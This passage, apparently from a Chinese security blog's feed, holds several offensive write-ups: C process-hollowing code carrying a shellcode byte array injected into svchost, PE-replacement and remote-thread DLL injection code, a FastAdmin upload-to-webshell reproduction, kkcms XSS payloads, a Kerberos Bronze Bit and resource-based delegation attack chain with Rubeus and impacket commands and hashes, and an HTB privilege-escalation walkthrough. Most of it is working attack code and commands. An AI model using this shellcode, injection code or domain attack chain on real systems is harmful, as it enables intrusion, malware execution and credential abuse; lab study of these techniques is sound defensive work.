uot;\x68\x02\x00\x11\x5c\x89\xe6\x50\x50\x50\x50\x40\x50\x40\x50&quot;&quot;\x68\xea\x0f\xdf\xe0\xff\xd5\x97\x6a\x10\x56\x57\x68\x99\xa5&quot;&quot;\x74\x61\xff\xd5\x85\xc0\x74\x0a\xff\x4e\x08\x75\xec\xe8\x67&quot;&quot;\x00\x00\x00\x6a\x00\x6a\x04\x56\x57\x68\x02\xd9\xc8\x5f\xff&quot;&quot;\xd5\x83\xf8\x00\x7e\x36\x8b\x36\x6a\x40\x68\x00\x10\x00\x00&quot;&quot;\x56\x6a\x00\x68\x58\xa4\x53\xe5\xff\xd5\x93\x53\x6a\x00\x56&quot;&quot;\x53\x57\x68\x02\xd9\xc8\x5f\xff\xd5\x83\xf8\x00\x7d\x28\x58&quot;&quot;\x68\x00\x40\x00\x00\x6a\x00\x50\x68\x0b\x2f\x0f\x30\xff\xd5&quot;&quot;\x57\x68\x75\x6e\x4d\x61\xff\xd5\x5e\x5e\xff\x0c\x24\x0f\x85&quot;&quot;\x70\xff\xff\xff\xe9\x9b\xff\xff\xff\x01\xc3\x29\xc6\x75\xc1&quot;&quot;\xc3\xbb\xf0\xb5\xa2\x56\x6a\x00\x53\xff\xd5&quot;;void test() {        STARTUPINFOA si;        PROCESS_INFORMATION pi;        ZeroMemory(&amp;si, sizeof(si));        ZeroMemory(&amp;pi, sizeof(pi));        si.cb = sizeof(STARTUPINFOA);        if (!CreateProcessA(&quot;C:\\Windows\\sysWoW64\\svchost.exe&quot;, NULL, NULL, NULL, FALSE,  CREATE_SUSPENDED, NULL, NULL, &amp;si, &amp;pi)) {               printf(&quot;CreateProcess Error Code:%d\n&quot;, GetLastError());               return;        }        printf(&quot;CreateProcess Sucess\n&quot;);        CONTEXT ctx;        ctx.ContextFlags = CONTEXT_ALL;        if (!GetThreadContext(pi.hThread, &amp;ctx)) {               printf(&quot;GetThreadContext Error Code:%d\n&quot;, GetLastError());               return;        }        printf(&quot;GetThreadContext Sucess\n&quot;);        DWORD dwImageBase = 0;        DWORD lpNumberOfBytesRead = 0;        if (!ReadProcessMemory(pi.hProcess, (LPCVOID)(ctx.Ebx + 0x8), &amp;dwImageBase,  sizeof(DWORD), &amp;lpNumberOfBytesRead)) {               printf(&quot;ReadProcessMemory Error Code:%d\n&quot;, GetLastError());               return;        }        printf(&quot;ReadProcessMemory Sucess\n&quot;);        DWORD NumberOfBytesWritten = 0;        if (!WriteProcessMemory(pi.hProcess, (LPVOID)ctx.Eax, buf, sizeof(buf),  &amp;NumberOfBytesWritten)) {               printf(&quot;WriteProcessMemory Error Code:%d\n&quot;);        }        printf(&quot;WriteProcessMemory Sucess\n&quot;);        if (ResumeThread(pi.hThread) == -1) { //恢复线程执行成功的话函数返回为0               printf(&quot;ResumeThread Error Code:%d\n&quot;,GetLastError());        }        printf(&quot;ResumeThread Sucess\n&quot;);}int main(){        test();        system(&quot;pause&quot;);    return 0;}</code></pre><p><img src="https://z3.ax1x.com/2021/04/06/c3n2yF.md.png" alt=""></p><p><img src="https://z3.ax1x.com/2021/04/06/c3nhw9.png" alt=""></p><p><strong>x86进程替换</strong><br>1.创建进程CreateProcessA<br>2.获取进程PEB地址GetThreadContext<br>3.读取文件获取文件句柄 CreateFileA #替换掉目标文件的恶意文件<br>4.获取文件大小 GetFileSize<br>5.定义一个恶意文件的大小内存空间<br>6.读取文件内容 ReadFile<br>7.获取恶意文件内容的DOS头 (PIMAGE_DOS_HEADER)pBuf<br>8.获取恶意文件内容的NT头 (PIMAGE_NT_HEADERS)(pBuf + pDosHeader-&gt;e_lfanew)<br>9.更改创建进程的基地址允许执行权限((LPVOID)pNtHeaders-&gt;OptionalHeader.ImageBase)<br>10.往进程内存写入恶意文件WriteProcessMemory(pi.hProcess,lpAddr,(LPCVOID)pBuf,pNtHeaders-&gt;OptionalHeader.SizeOfHeaders,NULL); //指向要写的数据的指针。<br>11.替换字节<br>12.替换PEB中基地址<br>13.替换入口点</p><p>pDosHeader-&gt;e_lfanew DOS偏移头<br>pNtHeaders-&gt;OptionalHeader.ImageBase 基地址<br>pNtHeaders-&gt;OptionalHeader.SizeOfImage PE大小<br>pNtHeaders-&gt;FileHeader.NumberOfSections 节表大小<br> (LPVOID)((DWORD)lpAddr + pSectionHeader-&gt;VirtualAddress 节区的RVA地址<br> (LPCVOID)((DWORD)pBuf + pSectionHeader-&gt;PointerToRawData 在文件中的偏移<br>dwImageBase +  pNtHeaders-&gt;OptionalHeader.AddressOfEntryPoint 程序执行入口RVA</p><pre><code class="c">#include &quot;stdafx.h&quot;#include &lt;Windows.h&gt;void test() {        CHAR test[MAX_PATH] = &quot;C:\\Windows\\SysWOW64\\explorer.exe&quot;;        CHAR test2[MAX_PATH] = &quot;C:\\windows\\SysWOW64\\calc.exe&quot;;        STARTUPINFOA si;        PROCESS_INFORMATION pi;        ZeroMemory(&amp;si, sizeof(si));        ZeroMemory(&amp;pi, sizeof(pi));        if (!CreateProcessA(test, NULL, NULL, NULL, FALSE, NULL, NULL, NULL, &amp;si, &amp;pi)) {               printf(&quot;CreateProcess Error:%d\n&quot;,GetLastError());               return;        }        printf(&quot;CreateProcess Sucess\n&quot;);        CONTEXT ctx;        ctx.ContextFlags = CONTEXT_ALL;        if (!GetThreadContext(pi.hThread, &amp;ctx)) {               printf(&quot;GetThreadContext Error Code:%d\n&quot;, GetLastError());               return;        }        printf(&quot;GetThreadContext Sucess\n&quot;);        HANDLE hFile = CreateFileA(test2, GENERIC_READ, FILE_SHARE_READ | FILE_SHARE_WRITE  | FILE_SHARE_DELETE,               NULL, OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);        if (hFile == INVALID_HANDLE_VALUE)        {               printf(&quot;Open EXE File Filed&quot;);               printf(&quot;%d&quot;, GetLastError());               return;        }        DWORD dwSize = GetFileSize(hFile, NULL);        LPBYTE pAllocPE = NULL;        PBYTE pBuf = (PBYTE)malloc(dwSize);        DWORD dwBytesRead = 0;        ReadFile(hFile, (LPVOID)pBuf, dwSize, &amp;dwBytesRead, NULL);        PIMAGE_DOS_HEADER pDosHeader = (PIMAGE_DOS_HEADER)pBuf;        PIMAGE_NT_HEADERS pNtHeaders = (PIMAGE_NT_HEADERS)(pBuf + pDosHeader-&gt;e_lfanew);        //2.获取进程上下文        CONTEXT stThreadContext;        stThreadContext.ContextFlags = CONTEXT_FULL;        if (GetThreadContext(pi.hThread, &amp;stThreadContext) == 0)        {               printf(&quot;CreateProcess failed (%d).\n&quot;, GetLastError());               return;        }        void* lpAddr = VirtualAllocEx(pi.hProcess,  (LPVOID)pNtHeaders-&gt;OptionalHeader.ImageBase,               pNtHeaders-&gt;OptionalHeader.SizeOfImage,               MEM_COMMIT | MEM_RESERVE,               PAGE_EXECUTE_READWRITE);//用Imagebase为起始地址避免了重定位。        if (lpAddr == NULL)        {               printf(&quot;VirtualAlloc failed (%d).\n&quot;, GetLastError());               return;        }        BOOL bRet = WriteProcessMemory(pi.hProcess,               lpAddr,               (LPCVOID)pBuf,//指向要写的数据的指针。               pNtHeaders-&gt;OptionalHeader.SizeOfHeaders,               NULL);        if (!bRet)        {               return ;        }        // 替换节        LPVOID lpSectionBaseAddr = (LPVOID)((DWORD)pBuf               + pDosHeader-&gt;e_lfanew + sizeof(IMAGE_NT_HEADERS));        PIMAGE_SECTION_HEADER pSectionHeader;        DWORD dwIndex = 0;        for (; dwIndex &lt; pNtHeaders-&gt;FileHeader.NumberOfSections; ++dwIndex)        {               pSectionHeader = (PIMAGE_SECTION_HEADER)lpSectionBaseAddr;               bRet = WriteProcessMemory(pi.hProcess,                       (LPVOID)((DWORD)lpAddr + pSectionHeader-&gt;VirtualAddress),                       (LPCVOID)((DWORD)pBuf + pSectionHeader-&gt;PointerToRawData),                       pSectionHeader-&gt;SizeOfRawData,                       NULL);               if (!bRet)               {                       return;               }               lpSectionBaseAddr = (LPVOID)((DWORD)lpSectionBaseAddr +  sizeof(IMAGE_SECTION_HEADER));        }        //6.恢复现场并运行傀儡进程        // 替换PEB中基地址        DWORD dwImageBase = pNtHeaders-&gt;OptionalHeader.ImageBase;        bRet = WriteProcessMemory(pi.hProcess, (LPVOID)(stThreadContext.Ebx + 8),  (LPCVOID)&amp;dwImageBase, sizeof(PVOID), NULL);        if (!bRet)        {               return;        }        // 替换入口点        stThreadContext.Eax = dwImageBase +  pNtHeaders-&gt;OptionalHeader.AddressOfEntryPoint;        bRet = SetThreadContext(pi.hThread, &amp;stThreadContext);        if (!bRet)        {               return;        }        ResumeThread(pi.hThread);        printf(&quot;PID: %d&quot;, pi.dwProcessId);        free(pBuf);}int main(){        test();        system(&quot;pause&quot;);        return 0;}</code></pre><p><img src="https://z3.ax1x.com/2021/04/06/c3nXeH.png" alt=""></p><p>x64傀儡进程参考：<a href="https://bbs.pediy.com/thread-253362.htm" target="_blank" rel="noopener">https://bbs.pediy.com/thread-253362.htm</a><br>EXE替换参考：<a href="https://jev0n.com/2020/03/11/65.html" target="_blank" rel="noopener">https://jev0n.com/2020/03/11/65.html</a></p>]]></content>
      
      
        <tags>
            
            <tag> 红队 </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>FastAdmin前台文件上传复现</title>
      <link href="/posts/de1b4dd1.html"/>
      <url>/posts/de1b4dd1.html</url>
      <content type="html"><![CDATA[<h2 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h2><p>漏洞发生于：2021年/4月1号<br>漏洞点：application\api\controller\Common.php<br>触发漏洞的url：/index/ajax/upload<br>要求：application\extra\upload.php里的chunking为true (分片上传为true)<br><img src="https://z3.ax1x.com/2021/04/04/cuYe9x.png" alt=""></p><h2 id="复现过程"><a href="#复现过程" class="headerlink" title="复现过程"></a>复现过程</h2><p>漏洞点分析<br>需要包括以下的post请求参数才行<br>1.chunkid参数<br>2.action参数<br>3.chunkindex参数<br>4.chunkcount参数<br>5.filename参数<br><img src="https://z3.ax1x.com/2021/04/04/cuYG4I.md.png" alt=""></p><p>随后进入if判断，当action参数不为merge或method不为clean的时候。调用chunk函数chunk($chunkid, $chunkindex, $chunkcount);进入分片文件上传<br><img src="https://z3.ax1x.com/2021/04/04/cuYDEj.md.png" alt=""></p><p>跟进chunk函数，<br>1.首先$destDir=RUNTIME_PATH/chunks路径, RUNTIME=ROOT_PATH . ‘runtime’ . DS (DS=根据系统的文件分隔符)<br><img src="https://z3.ax1x.com/2021/04/04/cuYrUs.md.png" alt=""></p><p>2.$fileName=$chunkid-$chunindex.part //$chunkid和$chunindex都可控<br>3.$destDir=$destDir.DS.$fileName //拼接得到最后文件路径<br>4.判断RUNTIME_PATH/chunks路径是否存在，不存在则创建文件夹<br>5.将临时文件移动到RUNTIME_PATH/chunks路径下<br><img src="https://z3.ax1x.com/2021/04/04/cuYhb4.md.png" alt=""></p><p>之后触发merge函数，写shell<br>要求action参数为merge<br><img src="https://z3.ax1x.com/2021/04/04/cutQzV.md.png" alt=""></p><p>首先chunkDir变量来自于下图<br>$chunkDir=RUNTIME_PATH . ‘chunks’<br><img src="https://z3.ax1x.com/2021/04/04/cut3sU.md.png" alt=""></p><p>1.$filePath=RUNTIME_PATH . ‘chunks’.DS.$chunkid //$chunkid参数可控<br>2.根据$chunkcount变量进行循环<br>3.判断$filePath-$i-.part文件是否存在<br>4.如果文件存在，在/runtime/chunks路径下创建以$filepath作为文件名的文件$destFile=@fopen($uploadPath, “wb”)<br>5.锁定文件<br>6.根据$chunkcount参数循环 //$chunkcount参数可控<br>7.$partFile=$filePath-$i-.part<br>8.循环读取$partFile内容，写入文件到$filepath<br>9.读取完文件后，删除分片文件，释放文件锁定，关闭文件句柄<br><img src="https://z3.ax1x.com/2021/04/04/cutDsO.md.png" alt=""></p><p><img src="https://z3.ax1x.com/2021/04/04/cutrLD.md.png" alt=""></p><p>exp分析:<br><img src="https://z3.ax1x.com/2021/04/04/cut2FA.png" alt=""></p><p><img src="https://z3.ax1x.com/2021/04/04/cut4Qf.png" alt=""></p><p>exp地址:<a href="https://github.com/exp1orer/FastAdmin_Upload" target="_blank" rel="noopener">https://github.com/exp1orer/FastAdmin_Upload</a></p><p><img src="https://z3.ax1x.com/2021/04/04/cut5y8.png" alt=""></p><p>至于这里的shell地址为什么是根目录，因为这个exp是这么写的<br><img src="https://z3.ax1x.com/2021/04/04/cutjS0.md.png" alt=""></p><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a href="https://zhuanlan.zhihu.com/p/57166400" target="_blank" rel="noopener">https://zhuanlan.zhihu.com/p/57166400</a><br><a href="https://xz.aliyun.com/t/9395" target="_blank" rel="noopener">https://xz.aliyun.com/t/9395</a><br><a href="https://mp.weixin.qq.com/s/otrH75ZjCHBQbRB7g5DdWg" target="_blank" rel="noopener">https://mp.weixin.qq.com/s/otrH75ZjCHBQbRB7g5DdWg</a></p>]]></content>
      
      
        <tags>
            
            <tag> 代码审计 </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>kkcms1.371代码审计</title>
      <link href="/posts/de5a64f.html"/>
      <url>/posts/de5a64f.html</url>
      <content type="html"><![CDATA[<p>看微信公众号有个审计这个CMS的文章。跟着复现了一下，大体来说这个CMS还是比较安全的<br>but，部分功能写法完全不统一。写sql查询的时候有些用了PDO，有些直接带入查询</p><h2 id="预处理分析"><a href="#预处理分析" class="headerlink" title="预处理分析"></a>预处理分析</h2><p>除了编辑器以外的php都会引用system/inc.php或者system/library.php</p><ul><li>library.php 处理函数和单双引号转义处理</li><li>inc.php 引用了system目录里的所有文件</li></ul><h2 id="大概分析"><a href="#大概分析" class="headerlink" title="大概分析"></a>大概分析</h2><p>首先是install/index2.php。写入数据库和生成install.lock文件的处理<br><img src="https://z3.ax1x.com/2021/03/31/cFIVqP.png" alt=""></p><p>首先加载了/system/library.php<br><img src="https://z3.ax1x.com/2021/03/31/cFIlxs.png" alt=""></p><p>可以看到，对所有的请求对单双引号进行了转义</p><pre><code class="php">if (!defined(&#39;PCFINAL&#39;)) {    exit(&#39;Request Error!&#39;);}if (!get_magic_quotes_gpc()) {    if (!empty($_GET)) {        $_GET = addslashes_deep($_GET);    }    if (!empty($_POST)) {        $_POST = addslashes_deep($_POST);    }    $_COOKIE = addslashes_deep($_COOKIE);    $_REQUEST = addslashes_deep($_REQUEST);}</code></pre><p>之后index2.php的流程<br>1.判断了install.lock文件是否存在<br>2.将数据库配置信息写入到system/data.php<br>3.往数据库导入sql</p><p>由于过滤了特殊符号，这里单引号没法闭合。无法利用<br>安装完默认后台:admin/123456</p><h3 id="xss"><a href="#xss" class="headerlink" title="xss"></a>xss</h3><p>template\wapian\movie.php<br><img src="https://z3.ax1x.com/2021/03/31/cFI0z9.png" alt=""></p><p>getPageHtml函数是用来模板渲染的<br><img src="https://z3.ax1x.com/2021/03/31/cFIDMR.png" alt=""></p><p>看了一下payload主要还是<code>$yourneed</code>参数，跟踪发现来自360.php<br><img src="https://z3.ax1x.com/2021/03/31/cFIgIO.png" alt=""></p><p><img src="https://z3.ax1x.com/2021/03/31/cFIcdK.png" alt=""></p><p>无任何过滤<br>payload:<code>m=&quot;11111111111&quot;&gt;&lt;script&gt;prompt(/xss/)&lt;/script&gt;&lt;</code><br><img src="https://z3.ax1x.com/2021/03/31/cFIRiD.png" alt=""></p><p>貌似payload并不会因为addslashes_deep函数而失效</p><p>个人信息修改处，无任何过滤造成存储型xss<br><img src="https://z3.ax1x.com/2021/03/31/cFoKw6.png" alt=""></p><p>payload:”<code>&gt;&lt;script&gt;prompt(/xss/)&lt;/script&gt;&lt;&quot;</code><br><img src="https://z3.ax1x.com/2021/03/31/cFoGSH.png" alt=""></p><p><img src="https://z3.ax1x.com/2021/03/31/cFoJld.png" alt=""></p><p>申请友链的存储xss<br><img src="https://z3.ax1x.com/2021/03/31/cFoop4.png" alt=""></p><p>后台处理<br><img src="https://z3.ax1x.com/2021/03/31/cFoO76.png" alt=""></p><p><img src="https://z3.ax1x.com/2021/03/31/cFojAK.png" alt=""></p><p>留言板和这个差不多一致，省略</p><h3 id="SQL注入"><a href="#SQL注入" class="headerlink" title="SQL注入"></a>SQL注入</h3><p>虽然使用了addslashes_deep函数。导致登录处和代单/双引号的sql无法闭合，数据库也不是GBK<br>but还是有一处盲注<br><img src="https://z3.ax1x.com/2021/03/31/cFTS9e.png" alt=""></p><p><img src="https://z3.ax1x.com/2021/03/31/cFT9cd.png" alt=""></p><h3 id="cookie爆破后台绕过验证码"><a href="#cookie爆破后台绕过验证码" class="headerlink" title="cookie爆破后台绕过验证码"></a>cookie爆破后台绕过验证码</h3><p><img src="https://z3.ax1x.com/2021/03/31/cFTZ4S.png" alt=""></p><p><img src="https://z3.ax1x.com/2021/03/31/cFTkHP.png" alt=""></p><h3 id="任意文件读取"><a href="#任意文件读取" class="headerlink" title="任意文件读取"></a>任意文件读取</h3><p>在开启了 allow_url_fopen和allow_url_include开启后会变成RCE<br><img src="https://z3.ax1x.com/2021/03/31/cFTm9g.png" alt=""></p><h2 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h2><p>这套CMS靠着一些奇怪的方法来导致原本可利用的漏洞无法利用，例如后台功能大部分可以越权利用。但是另外的函数找不到，导致利用失败<br><img src="https://z3.ax1x.com/2021/03/31/cFTwuR.png" alt=""></p><p>总的来说，这套CMS有点水</p><p>参考链接:<a href="https://mp.weixin.qq.com/s?__biz=MzU0MDg5MzIzMQ==&amp;mid=2247485517&amp;idx=1&amp;sn=24b6f24b506ecaa64ec2897e8302ee7b" target="_blank" rel="noopener">https://mp.weixin.qq.com/s?__biz=MzU0MDg5MzIzMQ==&amp;mid=2247485517&amp;idx=1&amp;sn=24b6f24b506ecaa64ec2897e8302ee7b</a></p>]]></content>
      
      
        <tags>
            
            <tag> 代码审计 </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>Kerberos Bronze Bit Attack 绕过约束委/资源派限制</title>
      <link href="/posts/9cf32cdf.html"/>
      <url>/posts/9cf32cdf.html</url>
      <content type="html"><![CDATA[<h2 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h2><p>该漏洞解决了两个问题<br>1.禁止协议转换/协议过渡<br>2.受保护的用户和敏感用户不能被委派<br>具体设置表现为DC上设置Service1计算机账户为“仅使用Kerberos”而非“使用任何身份验证协议”  </p><h2 id="域环境"><a href="#域环境" class="headerlink" title="域环境"></a>域环境</h2><p>DC：WIN-5CHMN9C4UES.YAYI.local (Windows Server 2012)<br>域内两台机器：<br>one2008.YAYI.local (Windows Server 2008)<br>WIN-BMIO66D4K15.YAYI.local (Windows 7)</p><p>域用户:<br>fwwr<br>joke</p><h2 id="传统的约束委派绕过"><a href="#传统的约束委派绕过" class="headerlink" title="传统的约束委派绕过"></a>传统的约束委派绕过</h2><p>服务用户：<br><img src="https://s4.ax1x.com/2021/03/19/6W8P3R.png" alt=""></p><p>委派对象：目标机器WIN-5CHMN9C4UES.YAYI.local<br><img src="https://s4.ax1x.com/2021/03/19/6W8VHO.png" alt=""></p><p><img src="https://s4.ax1x.com/2021/03/19/6W8n4H.png" alt=""></p><p>常规的约束委派利用:</p><pre><code>1. 得到约束委派机器的用户凭证2. 发现委派用户委派的目标机器3. 获取RC4利用</code></pre><p>powerview查看约束委派的机器:</p><pre><code>Get-DomainComputer -TrustedToAuth -Properties distinguishedname,msds-allowedtodelegateto | fl</code></pre><p><img src="https://s4.ax1x.com/2021/03/19/6W8f2R.png" alt=""></p><p>Rubeus一条命令实现约束委派：</p><pre><code>Rubeus.exe s4u /user:fwwr /domain:YAYI.local /rc4:ca69e7f0f02d9156d1616ba6abd395b6 /impersonateuser:administrator /msdsspn:&quot;dhcp/WIN-5CHMN9C4UES.YAYI.local/YAYI.local&quot; /altservice:cifs /ptt</code></pre><p>由于用户设置了”敏感用户，不能被委派”，将造成失败<br><img src="https://s4.ax1x.com/2021/03/19/6W8jxI.png" alt=""></p><p>使用新版impacket绕过：（截至最新版本：0.9.22），最低版本要求：（0.9.21）<br>先登录one2008机器用mimikatz获取AES和RC4</p><pre><code>privilege::debugsekurlsa::&quot;ekeys&quot;</code></pre><p><img src="https://s4.ax1x.com/2021/03/19/6WGCdS.png" alt=""></p><p>获取TGT导入smbexec连接</p><pre><code>python3 getST.py -spn cifs/WIN-5CHMN9C4UES.YAYI.local -impersonate administrator -hashes AAD3B435B51404EEAAD3B435B51404EE:0adce35e9d541588782a98fe1fce59cf -aesKey 56f41eb095b4099b27934963200180321742c6f89db55bff02495b22b17afe69 YAYI.local/one2008 -force-forwardableexport KRB5CCNAME=administrator.ccachesudo python3 smbexec.py -no-pass -k WIN-5CHMN9C4UES.YAYI.local</code></pre><p><img src="https://s4.ax1x.com/2021/03/19/6WGkGj.png" alt=""></p><p><img src="https://s4.ax1x.com/2021/03/19/6WGZMq.png" alt=""></p><h2 id="基于资源的约束委派绕过"><a href="#基于资源的约束委派绕过" class="headerlink" title="基于资源的约束委派绕过"></a>基于资源的约束委派绕过</h2><p>先配置环境，首先删除上一步service1的委派权限<br><img src="https://s4.ax1x.com/2021/03/19/6WGKdU.png" alt=""></p><p>用adsi编辑器赋予域用户joke对 one2008写入权限<br><img src="https://s4.ax1x.com/2021/03/19/6WG3W9.png" alt=""></p><p>joke用户可登录WIN-BMIO66D4K15，登录进去后<br>过powermad新加入一个计算机账户AttackerService，密码为AttackerServicePassword</p><pre><code>Import-Module .\powermad.ps1New-MachineAccount -MachineAccount AttackerService -Password $(ConvertTo-SecureString &#39;AttackerServicePassword&#39; -AsPlainText -Force)</code></pre><p><img src="https://s4.ax1x.com/2021/03/19/6WGsSA.png" alt=""></p><p>用mimikatz计算出hash<br><img src="https://s4.ax1x.com/2021/03/19/6WJ961.png" alt=""></p><p>使用PowerShell Active Directory模块添加基于资源的约束委派，即从AttackerService到one2008的传入信任关系。</p><pre><code>Import-Module .\Microsoft.ActiveDirectory.Management.dllGet-ADComputer AttackerService #确认机器账户已经被添加Set-ADComputer one2008 -PrincipalsAllowedToDelegateToAccount AttackerService$ #设置域用户到目标机器Get-ADComputer one2008 -Properties PrincipalsAllowedToDelegateToAccount #查看机器</code></pre><p>验证用户是否成功委派到目标机器</p><pre><code>Get-DomainUser -Identity &lt;user&gt; -Properties objectsid #获取某个用户的SIDGet-DomainObjectAcl -Identity one2008.YAYI.local  | ?{$_.SecurityIdentifier -match &quot;S-1-5-21-2799505025-1944254007-2887416074-1618&quot;} #查询某个机子的ACL</code></pre><p><img src="https://s4.ax1x.com/2021/03/19/6WJmpd.png" alt=""></p><p>可以看到现在对One2008.YAYI.local有完全的控制权限，直接申请TGT远程连接即可 (这里的RC4和AES key是上面的mimikatz获取的)</p><pre><code>python3 getST.py -spn cifs/one2008.YAYI.local -impersonate administrator -hashes 830f8df592f48bc036ac79a2bb8036c5:830f8df592f48bc036ac79a2bb8036c5 -aesKey 537056f14b0f81bc6e4be6ddba7786efdadb813c61ed5a6dce1b YAYI.local/AttackerService -force-forwardableexport KRB5CCNAME=administrator.ccachepython3 psexec.py -no-pass -k one2008.YAYI.local</code></pre><p><img src="https://s4.ax1x.com/2021/03/19/6WJaXq.png" alt=""></p><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a href="https://y4er.com/post/kerberos-bronze-bit-attack/" target="_blank" rel="noopener">https://y4er.com/post/kerberos-bronze-bit-attack/</a></p>]]></content>
      
      
        <tags>
            
            <tag> 域渗透 </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>HTB laboratory</title>
      <link href="/posts/2ee11a81.html"/>
      <url>/posts/2ee11a81.html</url>
      <content type="html"><![CDATA[<h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><p>常规nmap扫描</p><pre><code>nmap -sC -sV 10.10.10.216</code></pre><p><img src="https://s3.ax1x.com/2021/03/18/6gqiSe.png" alt=""></p><p>从扫描结果能看到，有两个域</p><pre><code>laboratory.htbgit.laboratory.htb</code></pre><p>加入/etc/hosts<br><img src="https://s3.ax1x.com/2021/03/18/6gqFQH.png" alt=""></p><p>访问<code>laboratory.htb</code>发现就一个静态，拉倒下面有三个用户名。先记录下来<br><img src="https://s3.ax1x.com/2021/03/18/6gqAOA.md.png" alt=""></p><p>访问<code>git.laboratory.htb</code>是一个gitlab，注册gitlab发现版本<br>（ps:这里注册gitlab用他域做邮箱域：<a href="mailto:`joker@laboratory.htb" target="_blank" rel="noopener">`joker@laboratory.htb</a>`，不然会注册失败）<br><img src="https://s3.ax1x.com/2021/03/18/6gqeTP.png" alt=""></p><p>![](<a href="https://s3.ax1x.com/2021/03/18/6gqnFf.png" target="_blank" rel="noopener">https://s3.ax1x.com/2021/03/18/6gqnFf.png</a></p><h2 id="入口点"><a href="#入口点" class="headerlink" title="入口点"></a>入口点</h2><p>搜索gitlab对应的版本发现存在RCE,msf用对应的利用工具<br><img src="https://s3.ax1x.com/2021/03/18/6gqB6J.png" alt=""></p><p>查看刚刚收集到的用户名，发现Dexter是CEO。修改他的密码<br><img src="https://s3.ax1x.com/2021/03/18/6gqDX9.png" alt=""></p><p>登录它的gitlab发现有id_rsa<br><img src="https://s3.ax1x.com/2021/03/18/6gqsmR.png" alt=""></p><p>ssh连接得到user.txt<br><img src="https://s3.ax1x.com/2021/03/18/6gq46H.png" alt=""></p><p><img src="img/user.png" alt=""></p><h2 id="权限提升"><a href="#权限提升" class="headerlink" title="权限提升"></a>权限提升</h2><p>suid查找发现存在个docker-security。strings查看，发现有执行命令chmod。利用劫持提权</p><pre><code>echo &quot;/bin/bash&quot; &gt; /tmp/chmodchmod 777 /tmp/chmodexport PATH=/tmp:$PATH</code></pre><p><img src="https://s3.ax1x.com/2021/03/18/6gqqtf.png" alt=""></p>]]></content>
      
      
        <tags>
            
            <tag> htb </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>远程线程注入(系统进程)</title>
      <link href="/posts/b76f927c.html"/>
      <url>/posts/b76f927c.html</url>
      <content type="html"><![CDATA[<p>最近在看windows黑客编程的pdf，跟着复现一下。看到突破SESSION 0隔离的远程线程注入。发现是直接将dll注入到<br>系统进程，试了一下并不行，抄网上的code发现也不行。发现大部分都是在2008上测的，而且注入的函数也没多大区别。<br>然后联想到是不是权限的问题，试了一下确实是</p><h2 id="用到的API函数"><a href="#用到的API函数" class="headerlink" title="用到的API函数"></a>用到的API函数</h2><p>远程线程注入：</p><ul><li>OpenProcess</li><li>VirtualAllocEx</li><li>WriteProcessMemory</li><li>CreateRemoteThread</li></ul><p>特权开启：</p><ul><li>OpenProcessToken</li><li>LookupPrivilegeValueA</li><li>AdjustTokenPrivileges</li></ul><h2 id="复现过程"><a href="#复现过程" class="headerlink" title="复现过程"></a>复现过程</h2><p>开启SeDebugPrivilege特权</p><pre><code class="C">bool EnbalePrivileges() {        HANDLE hToken = NULL;        LUID luidValue = { 0 };        TOKEN_PRIVILEGES tp = { 0 };        DWORD wdret = OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES,  &amp;hToken);        if (wdret == NULL) {               errorprint(&quot;OpenProcessToken&quot;);        }        BOOL privilege=LookupPrivilegeValueA(NULL,&quot;SeDebugPrivilege&quot;,&amp;luidValue); //检索本地唯一性标识符的特定系统上用于局部地（LUID）表示指定的权限名称        if (privilege == false) {               errorprint(&quot;LookupPrivilegeValueA Privilege:SeDebugPrivilege&quot;);        }        tp.PrivilegeCount = 1;        tp.Privileges[0].Luid = luidValue;        tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;        bool bRet = AdjustTokenPrivileges(hToken, FALSE, &amp;tp, 0, NULL, NULL); //设置特权开启/关闭        if (bRet == false) {               errorprint(&quot;Enable Privilege Failure\n&quot;);        }        if (GetLastError() == ERROR_SUCCESS) {               printf(&quot;Enable Privilege:SeDebugPrivilege Sucess\n&quot;);        }}</code></pre><p>完整代码</p><pre><code class="C">#include &quot;stdafx.h&quot;#include &lt;Windows.h&gt;#define errorprint(name){printf(&quot;%s Error Code:%d\n&quot;,name,GetLastError());return 1;}bool EnbalePrivileges() {        HANDLE hToken = NULL;        LUID luidValue = { 0 };        TOKEN_PRIVILEGES tp = { 0 };        DWORD wdret = OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES,  &amp;hToken);        if (wdret == NULL) {               errorprint(&quot;OpenProcessToken&quot;);        }        BOOL privilege=LookupPrivilegeValueA(NULL,&quot;SeDebugPrivilege&quot;,&amp;luidValue);        if (privilege == false) {               errorprint(&quot;LookupPrivilegeValueA Privilege:SeDebugPrivilege&quot;);        }        tp.PrivilegeCount = 1;        tp.Privileges[0].Luid = luidValue;        tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;        bool bRet = AdjustTokenPrivileges(hToken, FALSE, &amp;tp, 0, NULL, NULL);        if (bRet == false) {               errorprint(&quot;Enable Privilege Failure\n&quot;);        }        if (GetLastError() == ERROR_SUCCESS) {               printf(&quot;Enable Privilege:SeDebugPrivilege Sucess\n&quot;);        }}int main(){        int pid = 1148;        EnbalePrivileges();        char *dllname = &quot;C:\\Users\\JiuShi\\Desktop\\testdll.dll&quot;;        int dllnamesize = strlen(dllname) * 2;        HANDLE pidmodule = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);        if (pidmodule == NULL) {               printf(&quot;OpenProcess Error Code:%d\n&quot;, GetLastError());               return 1;        }        printf(&quot;OpenProcess HANDLE 0x%x\n&quot;, pidmodule);        LPVOID vaeAddr = VirtualAllocEx(pidmodule, NULL, dllnamesize, MEM_COMMIT,  PAGE_READWRITE);        if (vaeAddr == NULL) {               printf(&quot;VirtualAllocEx Error Code:%d\n&quot;, GetLastError());               return 1;        }        